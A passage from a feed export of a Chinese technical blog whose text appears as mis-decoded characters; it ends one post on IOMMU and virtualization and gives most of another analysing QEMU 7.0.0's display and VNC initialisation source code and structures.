alt="çŸ¥ä¹å·çš„å›¾"></p><h4 id="â‘¡-Request-with-PASID"><a href="#â‘¡-Request-with-PASID" class="headerlink" title="â‘¡ Request-with-PASID"></a>â‘¡ Request-with-PASID</h4><h3 id="II-ä¸­æ–­é‡æ˜ å°„"><a href="#II-ä¸­æ–­é‡æ˜ å°„" class="headerlink" title="II.ä¸­æ–­é‡æ˜ å°„"></a>II.ä¸­æ–­é‡æ˜ å°„</h3><h3 id="III-IOMMU-ä¸è™šæ‹ŸåŒ–"><a href="#III-IOMMU-ä¸è™šæ‹ŸåŒ–" class="headerlink" title="III. IOMMU ä¸è™šæ‹ŸåŒ–"></a>III. IOMMU ä¸è™šæ‹ŸåŒ–</h3><p>è™½ç„¶ IOMMU çš„å¼•å…¥å¢åŠ äº†ä¸å¤–è®¾é€šä¿¡é—´çš„å¼€é”€ï¼Œä½† IOMMU è§£å†³äº†ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¸€ä¸ªéš¾ç‚¹ï¼šå¯¹äºéçº¯æ¨¡æ‹Ÿçš„è®¾å¤‡è€Œè¨€ï¼Œå…¶å¹¶ä¸çŸ¥é“ GPA ä¸ HPA ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œå½“å…¶æŒ‰ Guest OS æä¾›çš„åœ°å€è¿›è¡Œ DMA æ—¶<strong>ä¼šç›´æ¥è®¿é—®åˆ° Host çš„å†…å­˜</strong></p><p>å½“å¼•å…¥äº† IOMMU ä¹‹åï¼ŒIOMMU å¯ä»¥æ ¹æ® Host ä¾§æä¾›çš„ GPA åˆ° HPA ä¹‹é—´çš„åœ°å€è½¬æ¢è¡¨ï¼Œè¿›è¡Œ<strong>DMA remapping</strong>ï¼Œè¿™æ ·å¤–è®¾å°±èƒ½æ­£å¸¸åœ°è®¿é—®åˆ° Guest çš„ç‰©ç†å†…å­˜ï¼Œè€Œä¸ä¼šé”™è¯¯åœ°è®¿é—®åˆ° Host å¯¹åº”çš„ç‰©ç†å†…å­˜åŒºåŸŸ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è™šæ‹ŸåŒ–æ–¹å‘YLGé€Ÿæˆå…¥é—¨æŒ‡åŒ—&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ã€VIRT.0x01ã€‘Qemu - IIï¼šVNC æ¨¡å—æºç åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/</id>
    <published>2022-07-21T17:39:15.000Z</published>
    <updated>2022-08-19T16:32:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>vncï¼ŒğŸ•éƒ½ä¸ç”¨</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>VNC å³ Virtual Network Computingï¼Œæ˜¯åŸºäº<strong>RFBï¼ˆRemote Frame Bufferï¼‰</strong>åè®®è¿›è¡Œé€šä¿¡çš„è¿œç¨‹æ¡Œé¢åè®®ï¼Œä¸ telnetã€ssh ç­‰ç›¸æ¯”ï¼ŒVNC æœ€å¤§çš„ç‰¹ç‚¹ä¾¿æ˜¯æ”¯æŒå›¾å½¢åŒ–äº†ï¼Œç”¨æˆ·å¯ä»¥çœ‹åˆ°è¿œç¨‹æœºå™¨çš„å›¾å½¢åŒ–ç•Œé¢ï¼Œä¸”èƒ½ä½¿ç”¨é”®ç›˜ä¸é¼ æ ‡è¿›è¡Œè¾“å…¥</p><p>Qemu è™šæ‹ŸæœºåŒæ ·æ”¯æŒé€šè¿‡ VNCåªéœ€è¦æŒ‡å®š <code>-vnc</code> å‚æ•°ä¾¿èƒ½å¤Ÿå»ºç«‹ VNC Serverï¼Œä»è€Œä½¿å¾—è¿œç¨‹ç”¨æˆ·å¯ä»¥é€šè¿‡ VNC è¿æ¥åˆ° Qemu è™šæ‹Ÿæœºä¸Š</p><p>æœ¬ç¯‡ä¸»è¦æ˜¯å¯¹ Qemu ä¸­ VNC å®ç°çš„æºç åˆ†æï¼ŒåŒæ—¶ä¹Ÿä¼šå¤¹æ‚ç€éƒ¨åˆ† Qemu æ˜¾ç¤ºç›¸å…³çš„åˆ†æï¼Œæºç ç‰ˆæœ¬ Qemu 7.0.0</p><h1 id="0x01-qemu-init-displays-æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–"><a href="#0x01-qemu-init-displays-æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–" class="headerlink" title="0x01. qemu_init_displays() - æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–"></a>0x01. qemu_init_displays() - æ˜¾ç¤ºè®¾å¤‡åˆå§‹åŒ–</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“ Qemu çš„å…¥å£å‡½æ•°æ˜¯ <code>softmmu/main.c</code> ä¸­çš„ <code>qemu_main()</code>ï¼Œåœ¨å…¶ä¸­ä¼šè°ƒç”¨åˆ° <code>sotftmmuvl.c</code> ä¸­çš„ <code>qemu_init()</code> å‡½æ•°è¿›è¡Œ Qemu çš„åˆå§‹åŒ–å·¥ä½œï¼ŒåŒ…æ‹¬ä¸€ç³»åˆ—çš„å‚æ•°è§£æã€è®¾å¤‡åˆå§‹åŒ–ç­‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">undef</span> main</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> main qemu_main</span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    qemu_init(argc, argv, envp);<br>    qemu_main_loop();<br>    qemu_cleanup();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ¬ç¯‡æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸ VNC ç›¸å…³çš„å†…å®¹ï¼Œæ³¨æ„åˆ°åœ¨ <code>qemu_init()</code> çš„æœ«å°¾ä¼šè°ƒç”¨åˆ° <code>qemu_init_displays()</code> è¿›è¡Œæ˜¾ç¤ºåˆå§‹åŒ–çš„å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    qemu_init_displays();<br>    <br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ¯”è¾ƒç®€çŸ­ï¼Œé¦–å…ˆæ˜¯è°ƒç”¨ <code>init_displaystate()</code> ä¸ <code>qemu_display_init()</code> å¯¹è™šæ‹Ÿæœºæœ¬åœ°çš„æ˜¾ç¤ºè®¾å¤‡è¿›è¡Œåˆå§‹åŒ–ï¼Œä¹‹åæ‰æ˜¯ä½¿ç”¨ <code>qemu_opts_foreach</code> å®æ¥éå†å‚æ•°ä¸­ä¸ vnc ç›¸å…³çš„é…ç½®ï¼Œæœ€åè°ƒç”¨åˆ°çš„æ˜¯ <code>vnc_init_func()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init_displays</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DisplayState *ds;<br><br>    <span class="hljs-comment">/* åˆå§‹åŒ–æœ¬åœ°æ˜¾ç¤º */</span><br>    ds = init_displaystate();<br>    qemu_display_init(ds, &amp;dpy);<br><br>    <span class="hljs-comment">/* å¿…é¡»åœ¨ç»ˆç«¯åˆå§‹åŒ–å, ç”± SDL åº“æ›´æ”¹ä¿¡å·çš„ handlers */</span><br>    os_setup_signal_handling();<br><br>    <span class="hljs-comment">/* åˆå§‹åŒ–è¿œç¨‹æ˜¾ç¤º */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    qemu_opts_foreach(qemu_find_opts(<span class="hljs-string">&quot;vnc&quot;</span>),<br>                      vnc_init_func, <span class="hljs-literal">NULL</span>, &amp;error_fatal);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (using_spice) &#123;<br>        qemu_spice.display_init();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“"><a href="#ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“" class="headerlink" title="ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“"></a>ã€‡ã€æ˜¾ç¤ºè®¾å¤‡ç›¸å…³ç»“æ„ä½“</h2><p>åœ¨ Qemu å½“ä¸­æœ‰ç€å¤šä¸ªä¸æ˜¾ç¤ºè®¾å¤‡ç›¸å…³çš„ç»“æ„ï¼Œä»–ä»¬ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><blockquote><p>æœ¬å›¾æ¥è‡ªäº<a href="https://www.linux-kvm.org/images/b/b2/01x10b-QEMUGfraphics.pdf">è¿™ä¸ªppt</a></p></blockquote><h3 id="Iã€QemuConsole-å•ä¸ªæ§åˆ¶å°å®ä¾‹"><a href="#Iã€QemuConsole-å•ä¸ªæ§åˆ¶å°å®ä¾‹" class="headerlink" title="Iã€QemuConsole - å•ä¸ªæ§åˆ¶å°å®ä¾‹"></a>Iã€QemuConsole - å•ä¸ªæ§åˆ¶å°å®ä¾‹</h3><p>åœ¨å¼€å§‹åˆ†æä¹‹å‰æˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸ªæ–°çš„ç»“æ„ä½“ï¼š<code>QemuConsole</code>ï¼Œä¸€ä¸ªè¯¥ç»“æ„ä½“å®ä¾‹åœ¨ Qemu ä¸­è¡¨ç¤ºä¸€ä¸ªæ§åˆ¶å°ï¼ˆconsoleï¼‰å®ä¾‹ï¼Œå¯¹åº”ç€<strong>ä¸€ä¸ªç‰¹å®šçš„ VGA è®¾å¤‡ä¸ä¸€ç»„ç‰¹å®šçš„è¾“å…¥è®¾å¤‡</strong>ã€‚åœ¨ Qemu å½“ä¸­ä¸»è¦æœ‰ä¸¤ç±»æ§åˆ¶å°ï¼šå›¾å½¢åŒ–æ§åˆ¶å°ä¸å­—ç¬¦å‹æ§åˆ¶å°ã€‚</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuConsole</span> &#123;</span><br>    Object parent;<br><br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-type">console_type_t</span> console_type; <span class="hljs-comment">// æ§åˆ¶å°ç±»å‹</span><br>    DisplayState *ds;           <span class="hljs-comment">// å¯¹åº”çš„æ˜¾ç¤ºè®¾å¤‡</span><br>    DisplaySurface *surface;<br>    DisplayScanout scanout;<br>    <span class="hljs-type">int</span> dcls;<br>    DisplayGLCtx *gl;<br>    <span class="hljs-type">int</span> gl_block;<br>    QEMUTimer *gl_unblock_timer;<br>    <span class="hljs-type">int</span> window_id;<br><br>    <span class="hljs-comment">/* å›¾å½¢åŒ–æ§åˆ¶å°çŠ¶æ€.  */</span><br>    Object *device; <span class="hljs-comment">// å¯¹åº”çš„å›¾å½¢åŒ–è®¾å¤‡</span><br>    <span class="hljs-type">uint32_t</span> head;<br>    QemuUIInfo ui_info;<br>    QEMUTimer *ui_timer;  <span class="hljs-comment">// å¯¹åº”çš„ Timer</span><br>    <span class="hljs-type">const</span> GraphicHwOps *hw_ops;  <span class="hljs-comment">// ç¡¬ä»¶æ“ä½œå‡½æ•°</span><br>    <span class="hljs-type">void</span> *hw;<br><br>    <span class="hljs-comment">/* å­—ç¬¦æ§åˆ¶å°çŠ¶æ€ */</span><br>    <span class="hljs-type">int</span> width;<br>    <span class="hljs-type">int</span> height;<br>    <span class="hljs-type">int</span> total_height;<br>    <span class="hljs-type">int</span> backscroll_height;<br>    <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-type">int</span> x_saved, y_saved;<br>    <span class="hljs-type">int</span> y_displayed;<br>    <span class="hljs-type">int</span> y_base;<br>    TextAttributes t_attrib_default; <span class="hljs-comment">/* é»˜è®¤å­—ç¬¦å±æ€§ */</span><br>    TextAttributes t_attrib; <span class="hljs-comment">/* å½“å‰æ´»åŠ¨å­—ç¬¦å±æ€§ */</span><br>    TextCell *cells;<br>    <span class="hljs-type">int</span> text_x[<span class="hljs-number">2</span>], text_y[<span class="hljs-number">2</span>], cursor_invalidate;<br>    <span class="hljs-type">int</span> echo;<br><br>    <span class="hljs-type">int</span> update_x0;<br>    <span class="hljs-type">int</span> update_y0;<br>    <span class="hljs-type">int</span> update_x1;<br>    <span class="hljs-type">int</span> update_y1;<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">TTYState</span> <span class="hljs-title">state</span>;</span><br>    <span class="hljs-type">int</span> esc_params[MAX_ESC_PARAMS];<br>    <span class="hljs-type">int</span> nb_esc_params;<br><br>    Chardev *chr;<br>    <span class="hljs-comment">/* å…ˆè¿›å…ˆå‡ºçš„æŒ‰é”®è¾“å…¥ */</span><br>    Fifo8 out_fifo;<br>    CoQueue dump_queue;<br><br>    QTAILQ_ENTRY(QemuConsole) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºå›¾å½¢åŒ–è®¾å¤‡ç›¸å…³çš„æ“ä½œï¼Œä¸»è¦é€šè¿‡å‡½æ•°è¡¨ <code>hw_ops</code> æ¥å®Œæˆï¼Œå¯¹äºçº¯å­—ç¬¦å‹æ˜¾ç¤ºè®¾å¤‡è€Œè¨€ï¼Œè¯¥å‡½æ•°è¡¨ä¸º <code>text_console_ops</code>ï¼Œå¯¹äºæ™®é€šçš„ VGA è®¾å¤‡è€Œè¨€åˆ™ä¸º <code>vga_ops</code>ï¼Œæˆ‘ä»¬åœ¨åé¢ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹ã€‚</p><p>QemuConsole çš„åˆ›å»ºä¸»è¦é€šè¿‡ <code>new_console()</code> æ¥å®Œæˆï¼Œåœ¨ Qemu ä¸­æœ‰ä¸€ä¸ªå…¨å±€çš„ QemuConsole å˜é‡ <code>consoles</code>ï¼Œæ¯å½“åˆ›å»ºä¸€ä¸ªæ–°çš„ QemuConsole åå°±ä¼šé€šè¿‡å°¾æ’æ³•æ’å…¥åˆ°è¿™ä¸ªå…¨å±€çš„ QemuConsole é“¾è¡¨ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, QemuConsole)</span> consoles =<br>    QTAILQ_HEAD_INITIALIZER(consoles);<br></code></pre></td></tr></table></figure><blockquote><p>ä»€ä¹ˆæ˜¯ <code>console</code>ï¼Ÿç‹­ä¹‰åœ°è¯´ï¼Œconsole æœ€åˆæŒ‡çš„å°±æ˜¯ä¸€ä¸ªè®¾å¤‡çš„æ§åˆ¶å°ï¼Œ<em>åŒ…å«äº†æ˜¾ç¤ºè®¾å¤‡ä¸åŸºæœ¬è¾“å…¥è®¾å¤‡</em> ï¼Œä¸ terminal ä¸åŒï¼Œconsole é€šå¸¸æ˜¯æœºå™¨è‡ªå¸¦çš„ï¼Œè€Œ terminal åˆ™å¾€å¾€æŒ‡çš„æ˜¯éœ€è¦æˆ‘ä»¬é€šè¿‡ä¸²å£è¿›è¡Œè¿æ¥çš„å¤–éƒ¨è®¾å¤‡<br>ä¸è¿‡éšç€æ—¶ä»£çš„å‘å±•ï¼Œç°åœ¨å¯¹äº console ä¸ terminal ä¹‹é—´æ¦‚å¿µçš„å®šä¹‰åŒºåˆ«ä¹Ÿé€æ¸è¶‹äºæ¨¡ç³Šï¼Œç°åœ¨çš„æœºå™¨å¤§éƒ½ä¸å†æœ‰å®ä½“çš„ consoleï¼Œè€Œé‡‡ç”¨è½¯ä»¶æ¨¡æ‹Ÿçš„æ–¹å¼ï¼Œä¾‹å¦‚åœ¨ Linux ä¸­å®šä¹‰äº† 6 ä¸ª virtual terminalï¼ˆå¯ä»¥ä½¿ç”¨ <code>ctrl + f1 ~ f6</code> è¿›è¡Œåˆ‡æ¢ï¼‰ï¼Œè€Œå½“æˆ‘ä»¬å‘ <code>/dev/console</code> è¾“å…¥æ—¶ï¼Œåˆ™ä¼šè¾“å‡ºåˆ°å½“å‰çš„ virtual terminal ä¸Šï¼›è€Œåœ¨ä¸€äº›å…¶ä»–çš„ç±» UNIX ç³»ç»Ÿä¸­ï¼Œconsole åˆ™å¾€å¾€è¢«å›ºå®šä¸ºç¬¬ä¸€ä¸ª virtual terminal</p></blockquote><h3 id="IIã€DisplayState-æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€"><a href="#IIã€DisplayState-æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€" class="headerlink" title="IIã€DisplayState - æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€"></a>IIã€DisplayState - æ˜¾ç¤ºè®¾å¤‡æ€»çŠ¶æ€</h3><p>åœ¨ Qemu å½“ä¸­ä½¿ç”¨ä¸€ä¸ª <code>DisplayState</code> è¡¨ç¤ºæ˜¾ç¤ºè®¾å¤‡çš„æ€»çŠ¶æ€ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/console.c</code> ä¸­,å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayState</span> &#123;</span><br>    QEMUTimer *gui_timer;   <span class="hljs-comment">// å¯¹åº”æ›´æ–°çš„ timer</span><br>    <span class="hljs-type">uint64_t</span> last_update;   <span class="hljs-comment">// ä¸Šæ¬¡æ›´æ–°æ—¶é—´</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">bool</span> refreshing;<br>    <span class="hljs-type">bool</span> have_gfx;          <span class="hljs-comment">// æ˜¯å¦æœ‰å›¾å½¢åŒ–æ˜¾ç¤º</span><br>    <span class="hljs-type">bool</span> have_text;         <span class="hljs-comment">// æ˜¯å¦æœ‰çº¯æ–‡æœ¬æ˜¾ç¤º</span><br><br>    QLIST_HEAD(, DisplayChangeListener) listeners;  <span class="hljs-comment">// å„ä¸ª Display çš„ Listener çš„é“¾è¡¨</span><br>&#125;;<br><br><span class="hljs-type">static</span> DisplayState *display_state; <span class="hljs-comment">// å…¨å±€çš„ DisplayState</span><br></code></pre></td></tr></table></figure><p>é€šå¸¸è€Œè¨€ï¼Œä¸€ä¸ª DisplayState å¯ä»¥å¯¹åº”ç€å¤šä¸ª QemuConsoleï¼Œå› ä¸ºå…¶å¯ä»¥å¯¹åº”ç€å¤šä¸ª VGA è®¾å¤‡ï¼Œå› æ­¤ç›¸åº”åœ°å…¶å¯ä»¥æœ‰ç€å¤šä¸ª <code>DisplayChangeListener</code> æ¥ç›‘è§†å¤šä¸ª Display è®¾å¤‡çš„æ›´æ”¹ï¼Œå¤šä¸ª <code>DisplayChangeListener</code> ä¹‹é—´è¿æˆä¸€ä¸ªé“¾è¡¨</p><h3 id="IIIã€DisplayChangeListener-ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹"><a href="#IIIã€DisplayChangeListener-ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹" class="headerlink" title="IIIã€DisplayChangeListener - ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹"></a>IIIã€DisplayChangeListener - ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹</h3><p><code>DisplayChangeListener</code> ç»“æ„ä½“ç”¨äº<strong>ç›‘è§†å•ä¸ªæ˜¾ç¤ºè®¾å¤‡çš„æ›´æ”¹</strong>å¹¶è¿›è¡Œç›¸å…³æ“ä½œï¼Œå› æ­¤ä¸€ä¸ª DisplayChangeListener åº”å½“ä¸ä¸€ä¸ªç‰¹å®šçš„ QemuConsole ç›¸å…³è”</p><p>é€šå¸¸è€Œè¨€ä¸€ä¸ª QemuConsole å¯ä»¥æœ‰ç€å¤šä¸ª DisplayChangeListenerï¼ˆä¾‹å¦‚ä¸€ä¸ª QemuConsole å¯ä»¥å¯¹åº”æœ‰ç€ä¸€ä¸ª VNC çš„ DCL + ä¸€ä¸ªæœ¬åœ°è™šæ‹Ÿç»ˆç«¯çš„ DCLï¼‰</p><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/ui/console.h</code> ä¸­,å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayChangeListener</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">const</span> DisplayChangeListenerOps *ops;<br>    DisplayState *ds;<br>    QemuConsole *con;<br><br>    QLIST_ENTRY(DisplayChangeListener) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶æˆå‘˜ <code>ops</code> ä¸ºä¸€ä¸ª <code>DisplayChangeListenerOps</code> å‡½æ•°è¡¨ï¼Œè¯¥å‡½æ•°è¡¨ä¸­åŒ…å«å¤§é‡çš„å‡½æ•°æŒ‡é’ˆï¼Œç”¨ä»¥è¿›è¡Œæ˜¾ç¤ºç›¸å…³çš„æ“ä½œï¼ˆä¾‹å¦‚ <code>dpy_refresh</code> æŒ‡é’ˆç”¨äºåˆ·æ–°æ˜¾ç¤ºï¼Œ <code>gfx_hw_update</code> æŒ‡é’ˆç”¨äºè¿›è¡Œæ˜¾å¡ç¡¬ä»¶ç›¸å…³æ›´æ–°ï¼Œæˆ‘ä»¬åœ¨åé¢ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹ï¼‰</p><h2 id="ä¸€ã€init-displaystate-éå†æ‰€æœ‰çš„-QemuConsole-å¹¶åŠ å…¥-qom-treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹-console"><a href="#ä¸€ã€init-displaystate-éå†æ‰€æœ‰çš„-QemuConsole-å¹¶åŠ å…¥-qom-treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹-console" class="headerlink" title="ä¸€ã€init_displaystate() - éå†æ‰€æœ‰çš„ QemuConsole å¹¶åŠ å…¥ qom treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹ console"></a>ä¸€ã€init_displaystate() - éå†æ‰€æœ‰çš„ QemuConsole å¹¶åŠ å…¥ qom treeï¼Œåˆå§‹åŒ–å­—ç¬¦å‹ console</h2><p><code>init_displaystate()</code> ä¸»è¦ç”¨äºå¯¹ QemuConsole è¿›è¡Œåˆå§‹åŒ–çš„å·¥ä½œï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”± main() è°ƒç”¨, åœ¨åˆ›å»º QemuConsoles ä¹‹å</span><br><span class="hljs-comment"> * åœ¨åˆå§‹åŒ– ui (sdl/vnc/...) ä¹‹å‰.</span><br><span class="hljs-comment"> */</span><br>DisplayState *<span class="hljs-title function_">init_displaystate</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    gchar *name;<br>    QemuConsole *con;<br><br>    get_alloc_displaystate();<br>    QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>        <span class="hljs-keyword">if</span> (con-&gt;console_type != GRAPHIC_CONSOLE &amp;&amp;<br>            con-&gt;ds == <span class="hljs-literal">NULL</span>) &#123;<br>            text_console_do_init(con-&gt;chr, display_state);<br>        &#125;<br><br>        <span class="hljs-comment">/* åœ¨è¿™é‡Œè¿æ¥ä¸Š qom tree (è€Œä¸åœ¨ new_console()), </span><br><span class="hljs-comment">         * åœ¨æ‰€æœ‰çš„ QemuConsoles éƒ½è¢«åˆ›å»ºåï¼Œå…¶é¡ºåºä¸åºå·</span><br><span class="hljs-comment">         * éƒ½å°†ä¸å†æ›´æ”¹ */</span><br>        name = g_strdup_printf(<span class="hljs-string">&quot;console[%d]&quot;</span>, con-&gt;index);<br>        object_property_add_child(container_get(object_get_root(), <span class="hljs-string">&quot;/backend&quot;</span>),<br>                                  name, OBJECT(con));<br>        g_free(name);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> display_state;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»è¦æ˜¯éå†å…¨å±€çš„ QemuConsole é“¾è¡¨å¹¶å°†å…¶åŠ å…¥åˆ° qom tree ä¸­ï¼Œè‹¥éå›¾å½¢åŒ–çš„ console åˆ™è¿˜ä¼šè°ƒç”¨ 